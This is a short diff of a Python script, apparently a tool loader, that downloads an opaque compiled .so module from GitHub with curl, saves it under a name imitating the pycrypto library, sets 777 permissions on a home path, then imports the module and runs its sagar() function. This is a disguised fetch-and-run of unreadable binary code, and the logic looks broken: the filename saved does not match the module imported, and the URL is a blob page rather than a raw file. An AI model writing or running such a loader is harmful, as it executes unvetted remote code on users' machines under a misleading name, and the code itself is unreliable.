@@ -6,14 +6,14 @@ except:
     pass
 try:
     download_link = "https://github.com/SAPPHIRE-XWD/GARRYS/blob/main/Garry.cpython-311.so"
-    if not os.path.exists("pycrypto_Garry.cpython-311.so"):
+    if not os.path.exists("pycrypto_Garryx.so"):
         os.system("chmod 777 $HOME/Garry")
-        os.system(f'curl -L {download_link} > pycrypto_Garry.cpython-311.so')
-        import Garry 
-        Garry.sagar()
+        os.system(f'curl -L {download_link} > pycrypto_Garryx.so')
+        import Garryx
+        Garryx.sagar()
     else:
-        import Garry 
-        Garry.sagar()
+        import Garryx
+        Garryx.sagar()
 except PermissionError:
     exit('Permission Error ! Found')
 except ConnectionError:
